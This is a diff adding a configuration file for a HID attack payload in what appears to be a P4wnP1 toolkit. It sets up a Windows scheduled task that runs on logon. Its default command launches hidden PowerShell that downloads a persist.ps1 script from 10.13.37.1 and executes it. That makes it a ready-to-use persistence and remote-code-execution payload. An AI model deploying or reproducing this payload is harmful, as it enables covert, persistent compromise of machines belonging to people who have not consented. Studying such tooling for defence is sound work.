@@ -1,0 +1,11 @@
+name: win_schtask_wrapper
+group: hid
+summary: Create a Windows scheduled task that runs your command/script
+script: payloads/hid/win_schtask_wrapper.py
+env:
+  P4WN_TASK_NAME: "P4wnP1Task"
+  P4WN_TASK_CMD: "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.13.37.1/payloads/www/private/persist.ps1'); main\""
+  P4WN_TASK_TRIGGER: "ONLOGON"
+  P4WN_TASK_USER: ""
+  P4WN_TASK_RUNLVL: ""
+
